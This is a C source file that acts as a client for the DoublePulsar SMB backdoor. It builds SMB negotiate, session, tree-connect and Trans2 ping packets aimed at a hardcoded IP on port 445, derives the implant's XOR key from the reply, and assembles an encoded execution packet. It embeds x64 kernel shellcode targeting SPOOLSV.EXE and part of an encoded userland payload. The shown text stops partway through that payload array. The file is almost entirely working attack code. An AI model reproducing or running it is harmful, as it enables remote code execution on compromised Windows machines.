#define _CRT_SECURE_NO_WARNINGS

/*
DoublePulsar execute command using a structure
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <stdint.h>
#pragma comment(lib, "wsock32.lib")

typedef unsigned short ushort;
typedef unsigned char uchar;

/*
However, the TCP/IP protocol headers do not have padding bytes, so the compiler must be instructed not to add them additional bytes into structures
that map onto the IP protocol headers that a written to or read from Ethernet frames.
Structures that do not contain padding bytes are said to be 'packed'.
The syntax required to ensure structures are packed depends on the embedded C compiler.
The FreeRTOS+TCP implementation cannot use any C compiler specific syntax in the common (not MCU port specific) files,
and instead allows users to define their own packing directives in two very simple header files that are then included from the C files.
*/

/* Sources used:
https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html
https://www.geeksforgeeks.org/structure-member-alignment-padding-and-data-packing/
*/


unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

#pragma pack(1)
//struct __attribute__((__packed__)) net_bios
typedef struct
{
	uint16_t type; //added by me; remove if there is a problem
	uint16_t length;
	//uint32_t length;
} net_bios;

//struct __attribute__((__packed__)) smb_header
typedef struct
{
	unsigned char protocol[4];
	unsigned char command;
	uint32_t NTSTATUS;
	unsigned char flag;
	ushort flag2;
	ushort PIDHigh;
	unsigned char SecuritySignature[8];
	/*
	from Microsoft documentation: UCHAR  SecurityFeatures[8];
	unsigned char securityFeature[8]; OR 	BYTE SecuritySignature[8];
	*/
	ushort reserves;
	ushort tid;
	ushort pid;
	ushort uid;
	ushort mid;
} smb_header;

//struct __attribute__((__packed__)) Trans_Response

typedef struct
{
	unsigned char wordCount;
	ushort totalParameterCount;
	ushort totalDataCount;
	ushort maxParameterCount;
	ushort maxDataCount;
	unsigned char maxSetupCount;
	unsigned char reserved;
	ushort flags;
	uint32_t timeout;
	ushort reserved2;
	ushort parameterCount;
	ushort parameterOffset;
	ushort dataCount;
	ushort dataOffset;
	unsigned char setupCount;
	unsigned char reserved3;
	ushort subcommand;
	ushort byteCount;
	//ushort padding;  //creates 2 bytes, while the packet only needs 1
	unsigned char padding; //creates 1 byte.  do NOT use ushort for this padding
} Trans_Response;

//Size of params:  12 
/*
typedef struct
{
	ULONG DataSize;
	ULONG chunksize;
	ULONG offset;
} smb_parameters;
*/

//typedef struct __attribute__((__packed__)) 
typedef struct
{
	unsigned char parameters[12];
} smb_parameters;

typedef struct
{
	unsigned char smbdata[4096];
} smb_data;
#pragma pack(pop)

/*
# SMB_Parameters
{
UCHAR WordCount;
USHORT Words[WordCount] (variable);
}
# SMB_Data
{
USHORT ByteCount;
UCHAR Bytes[ByteCount] (variable);
}
*/

#ifdef _WIN32
#pragma pack(1)
typedef struct {
#else //For Linux
typedef struct __attribute__((__packed__)) {
#endif
	uint16_t SmbMessageType;
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4];
	uint8_t SmbCommand;
	uint32_t NtStatus;
	uint8_t flags;
	uint16_t flags2;
	uint16_t ProcessIDHigh;
	uint8_t signature[8];
	uint16_t reserved;
	uint16_t TreeId;
	uint16_t ProcessID;
	uint16_t UserID;
	uint16_t multipleID;
} TreeConnect_Response;
#ifdef _WIN32
#pragma pack(pop)
#endif

#ifdef _WIN32
#pragma pack(1)
typedef struct {
#else 	//For Linux
typedef struct __attribute__((__packed__)) {
#endif
	//NetBIOS header -- may need to make this separate from the SMB header
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;

	//SMB header
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags; ///0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 header
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;


	unsigned char SESSION_SETUP_PARAMETERS[12];
	/*
	ULONG DataSize;
	ULONG chunksize;
	ULONG offset;
	*/
} SMB_DOUBLEPULSAR_PINGREQUEST;
#ifdef _WIN32
#pragma pack(pop)
#endif

#ifdef _WIN32
#pragma pack(1)
typedef struct {
#else 	//For Linux
typedef struct __attribute__((__packed__)) {
#endif
	//NetBIOS header -- may need to make this separate from the SMB header
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;

	//SMB header
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags; ///0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	uint8_t wordCount;              //setupcount(1) + wordcount (14)

	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
} SMB_TRANS2_RESPONSE;
#ifdef _WIN32
#pragma pack(pop)
#endif

#ifdef _WIN32
#pragma pack(1)
typedef struct {
#else 	//For Linux
typedef struct __attribute__((__packed__)) {
#endif
	unsigned char wordCount;
	ushort totalParameterCount;
	ushort totalDataCount;
	ushort maxParameterCount;
	ushort maxDataCount;
	unsigned char maxSetupCount;
	unsigned char reserved;
	ushort flags;
	uint32_t timeout;
	ushort reserved2;
	ushort parameterCount;
	ushort parameterOffset;
	ushort dataCount;
	ushort dataOffset;
	unsigned char setupCount;
	unsigned char reserved3;
	ushort subcommand;
	ushort byteCount;
	//ushort padding;  //creates 2 bytes, while the packet only needs 1
	unsigned char padding; //creates 1 byte.  do NOT use ushort for this padding
} SMB_TRANS2_EXEC_PACKET;
#ifdef _WIN32
#pragma pack(pop)
#endif

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

void convert_name(char* out, char* name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

unsigned int LE2INT(unsigned char* data)
{
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

uint32_t ror(uint32_t dword, int bits) {
	return (dword >> bits) | (dword << (32 - bits));
}

uint32_t generate_process_hash(const char* process) {
	uint32_t proc_hash = 0;
	size_t len = strlen(process);
	char* proc = (char*)malloc(len + 2);
	strcpy(proc, process);
	proc[len] = '\0';

	for (size_t i = 0; i <= len; i++) {
		proc_hash = ror(proc_hash, 13);
		proc_hash += (unsigned char)proc[i];
	}

	free(proc);
	return proc_hash;
}

int kernel_shellcode_size = 0;
int shellcode_one_part_len = 0;
int shellcode_part_two_len = 0;
int userland_shellcode_size = 0;
unsigned char hMem[4096];

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr("192.168.0.70");
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid

	//Generates a dynamic TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char* ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\192.168.0.70\\IPC$");
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	//TreeConnect_Response treeresponse;
	//memcpy(&treeresponse, recvbuff, sizeof(TreeConnect_Response));
	TreeConnect_Response* treeresponse = (TreeConnect_Response*)recvbuff;
	/*
	Now treeresponse that maps to recvbuff, we can extract and use tree id & user ids*/
	//treeresponse->treeid;
	//treeresponse->userid;

	//set SMB values
	SMB_DOUBLEPULSAR_PINGREQUEST* pingpacket = (SMB_DOUBLEPULSAR_PINGREQUEST*)malloc(sizeof(SMB_DOUBLEPULSAR_PINGREQUEST));
	pingpacket->SmbMessageType = 0x0000;
	//fix here because the value needs to be dynamic not static
	//pingpacket->SmbMessageLength = SWAP_SHORT(0x4e);

	pingpacket->ProtocolHeader[0] = '\xff';
	pingpacket->ProtocolHeader[1] = 'S';
	pingpacket->ProtocolHeader[2] = 'M';
	pingpacket->ProtocolHeader[3] = 'B';
	pingpacket->SmbCommand = 0x32; //Trans2 

	pingpacket->ProcessIDHigh = 0x0000;
	pingpacket->NtStatus = 0x00000000;
	pingpacket->flags = 0x18;
	pingpacket->flags2 = 0xc007;
	//pingpacket->UserID = treeresponse->userid;
	pingpacket->UserID = userid;  //works when we copy the recvbuff response to a WORD userid->
	//Treeresponse structure sucks and probably will be removed later->
	/* BUG HERE: treeresponse->UserID comes back as corrupted for some reason
	  this needs to be treeresponse->UserID;
		Will return later to this later-> But currently works if both values are the same
	This is not always the case and this will need to be fixed later->  */
	pingpacket->reserved = 0x0000;
	pingpacket->ProcessID = 0xfeff; //treeresponse->ProcessID;        //treeresponse->ProcessID; //Default value:  0xfeff;
	//pingpacket->TreeId = treeresponse->TreeId;		//grab from SMB response
	pingpacket->TreeId = treeid;

	//pingpacket->multipleID = 0x41;
	pingpacket->multipleID = 65; //0x41;

	//test this with default values:
	pingpacket->TreeId = 2048;
	pingpacket->UserID = 2048;

	pingpacket->TreeId = treeid;
	pingpacket->UserID = userid;

	/*
	smb->tid = treeresponse.TreeId;
	smb->tid = treeid;

	smb->uid = treeresponse.UserId;
	smb->uid = userid;
	*/

	//trans2 packet stuff
	pingpacket->wordCount = 15; // 0x0F == 15 
	pingpacket->totalParameterCount = 12; //0x0C; // should be 12
	pingpacket->totalDataCount = 0; //SWAP_SHORT(0x0000); // should be 0

	pingpacket->MaxParameterCount = 1; //SWAP_SHORT(0x0100); // should be 1
	pingpacket->MaxDataCount = 0; //SWAP_SHORT(0x0000); // should be 0
	pingpacket->MaxSetupCount = 0; //SWAP_SHORT(0);     //should be 0
	pingpacket->reserved1 = 0; //SWAP_SHORT(0);
	pingpacket->flags1 = 0x0000;

	//trying little endian format for timeout
	pingpacket->timeout = 0x00ee3401;
	//pingpacket->timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
	//pingpacket->timeout = SWAP_WORD(0x0134ee00);    //little endian PING command
	//pingpacket->timeout = 0x0134ee00;;
	//0x866c3100 = PING command from somewhere else

	pingpacket->reserved2 = 0x0000; //SWAP_SHORT(0x0000);                 //should be 0x0000
	pingpacket->ParameterCount = 12; //0x0C;         //should be 12
	pingpacket->ParamOffset = 66; //0x0042;          //should be 66
	pingpacket->DataCount = 0; //SWAP_SHORT(0x000);          //should be 0 -> 0x0000
	pingpacket->DataOffset = 78; //0x004e;           //should be 78
	pingpacket->SetupCount = 1;			//should be 1 / 0x01
	pingpacket->reserved3 = 0; //0x00;			//should be 0x00
	pingpacket->subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	pingpacket->ByteCount = 13; //0xD;          //value should be 13
	pingpacket->padding = 0; //SWAP_SHORT(0x00);		//should be 0x00

	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket->signature[0] = 0;
	pingpacket->signature[1] = 0;
	pingpacket->signature[2] = 0;
	pingpacket->signature[3] = 0;
	pingpacket->signature[4] = 0;
	pingpacket->signature[5] = 0;
	pingpacket->signature[6] = 0;
	pingpacket->signature[7] = 0;
	//pingpacket.signature[8] = 0;

	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket->SESSION_SETUP_PARAMETERS[0] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[1] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[2] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[3] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[4] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[5] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[6] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[7] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[8] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[9] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[10] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[11] = 0;
	//pingpacket.SESSION_SETUP_PARAMETERS[12] = 0;

	unsigned int packetSize = sizeof(SMB_DOUBLEPULSAR_PINGREQUEST);
	unsigned int NetBIOSpacketSize = sizeof(SMB_DOUBLEPULSAR_PINGREQUEST) - 4;
	pingpacket->SmbMessageLength = htons(NetBIOSpacketSize);

	printf("size of packet:  %d\n", packetSize);
	printf("NetBIOS size of packet:  %d\n", NetBIOSpacketSize);
	hexDump(NULL, pingpacket, packetSize);

	send(sock, (char*)pingpacket, packetSize, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	free(pingpacket);

	//process response
	SMB_TRANS2_RESPONSE* transaction_response = (SMB_TRANS2_RESPONSE*)recvbuff;

	if (transaction_response->multipleID = 0x51)
	{
		//process the signature
		unsigned int sig = LE2INT(transaction_response->signature);

		//calculate the XOR key for DoublePulsar
		unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
		printf("Calculated XOR KEY:  0x%x\n", XorKey);

		unsigned char byte_xor_key[4];
		byte_xor_key[0] = (unsigned char)XorKey;
		byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
		byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
		byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);

		//create the Doublepulsar Execution Packet
		unsigned char buffer[4178];
		net_bios* nb = (net_bios*)buffer;
		smb_header* smb = (smb_header*)(buffer + sizeof(net_bios));
		SMB_TRANS2_EXEC_PACKET* trans2 = (SMB_TRANS2_EXEC_PACKET*)(buffer + sizeof(net_bios) + sizeof(smb_header));
		smb_parameters* smb_params = (smb_parameters*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
		//smb_parameters* smb_params = (smb_parameters*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
		smb_data* SMBDATA = (smb_data*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters));

		nb->type = 0x00;
		//nb->length = htons(4174); //NetBIOS size = totalPacketSize - 4 ( NetBIOS header is not counted )
		//Size of smb_header + size of Trans2_Response header + parameter size + SMB_Data are counted in the packet size
		//nb->length = htons(4174);
		nb->length = htons(sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters) + sizeof(smb_data));

		/*
		uint16_t htons_len = htons(4174);
		memcpy(buffer+2, &htons_len, 2);
		hexDump(0,buffer,10);
		*/

		smb->protocol[0] = '\xff';
		smb->protocol[1] = 'S';
		smb->protocol[2] = 'M';
		smb->protocol[3] = 'B';
		smb->command = 0x32;
		smb->NTSTATUS = 0x00000000;
		smb->flag = 0x18;
		smb->flag2 = 0xc007;
		smb->PIDHigh = 0x0000;
		smb->SecuritySignature[0] = 0;
		smb->SecuritySignature[1] = 0;
		smb->SecuritySignature[2] = 0;
		smb->SecuritySignature[3] = 0;
		smb->SecuritySignature[4] = 0;
		smb->SecuritySignature[5] = 0;
		smb->SecuritySignature[6] = 0;
		smb->SecuritySignature[7] = 0;

		smb->reserves = 0x0000;
		smb->pid = 0xfeff;
		//smb->tid = 2048;
		//smb->uid = 2048;

		smb->mid = 0x42;
		//smb->mid = 66;

		smb->tid = treeid;
		smb->uid = userid;

		/*
		smb->tid = treeresponse.TreeId;
		smb->tid = treeid;

		smb->uid = treeresponse.UserId;
		smb->uid = userid;
		*/

		trans2->wordCount = 15;
		trans2->totalParameterCount = 12;
		trans2->totalDataCount = 4096;
		trans2->maxParameterCount = 1;
		trans2->maxDataCount = 0;
		trans2->maxSetupCount = 0;
		trans2->reserved = 0;
		trans2->flags = 0x0000;
		trans2->timeout = 0x001a8925;
		trans2->reserved2 = 0x0000;
		trans2->parameterCount = 12;
		trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) < PARAMS ARE HERE >
		trans2->dataCount = 4096;
		trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters) < SMB DATA IS HERE >
		trans2->setupCount = 1;
		trans2->reserved3 = 0x00;
		trans2->subcommand = 0x000e;
		trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
		trans2->padding = 0x00;

		printf("Offset of Parameters:  %d\n", sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
		printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters));
		int param_offset_len = sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET);
		int dataOffset_len = sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters);
		trans2->parameterOffset = param_offset_len;
		trans2->dataOffset = dataOffset_len;

		//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
		//In this case, this is static but will change to be dynamic in the future.

		unsigned int TotalSizeOfPayload = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
		unsigned int ChunkSize = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
		unsigned int OffsetofChunkinPayload = 0x0000;

		memcpy(smb_params->parameters, (unsigned char*)&TotalSizeOfPayload, 4);
		memcpy(smb_params->parameters + 4, (unsigned char*)&ChunkSize, 4);
		memcpy(smb_params->parameters + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
		hexDump(0, smb_params->parameters, 12);
		int i;

		for (i = 0; i < 12; i++)
		{
			smb_params->parameters[i] ^= byte_xor_key[i % 4];
		}
		hexDump(0, smb_params->parameters, 12);

		unsigned char hMem[4096];
		const char* proc_name = "SPOOLSV.EXE";
		uint32_t hash = generate_process_hash(proc_name);
		printf("Process Hash for %s: 0x%08X\n", proc_name, hash);

		//void make_kernel_shellcode(const uint8_t* ring3, size_t ring3_len, const char* proc_name) {
		uint32_t proc_hash = generate_process_hash(proc_name);

		//Length: 780 bytes
		unsigned char shellcode[] =
			"\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
			"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3"
			"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04"
			"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49"
			"\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8"
			"\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb"
			"\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77"
			"\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6"
			"\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89"
			"\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00"
			"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00"
			"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01"
			"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9";

		unsigned char shellcode_part_two[] =
			"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9"
			"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10"
			"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0"
			"\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a"
			"\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00"
			"\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03"
			"\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48"
			"\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51"
			"\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09"
			"\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b"
			"\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02"
			"\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49"
			"\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8"
			"\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6"
			"\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49"
			"\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8"
			"\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41"
			"\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22"
			"\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d"
			"\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41"
			"\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac"
			"\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75"
			"\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
			"\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9"
			"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1"
			"\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41"
			"\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b"
			"\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
			"\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff"
			"\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66"
			"\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
			"\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56"
			"\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92"
			"\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05"
			"\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8"
			"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3";

		unsigned char ring3[] =
			"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
			"\xff\xff\xff\x48\xbb\x1d\xab\xfd\x0e\xd7\x3a\xd2\x27\x48"
			"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xe3\x7e"
			"\xea\x27\xd2\x12\x27\x1d\xab\xbc\x5f\x96\x6a\x80\x76\x4b"
			"\xe3\xcc\xdc\xb2\x72\x59\x75\x7d\xe3\x76\x5c\xcf\x72\x59"
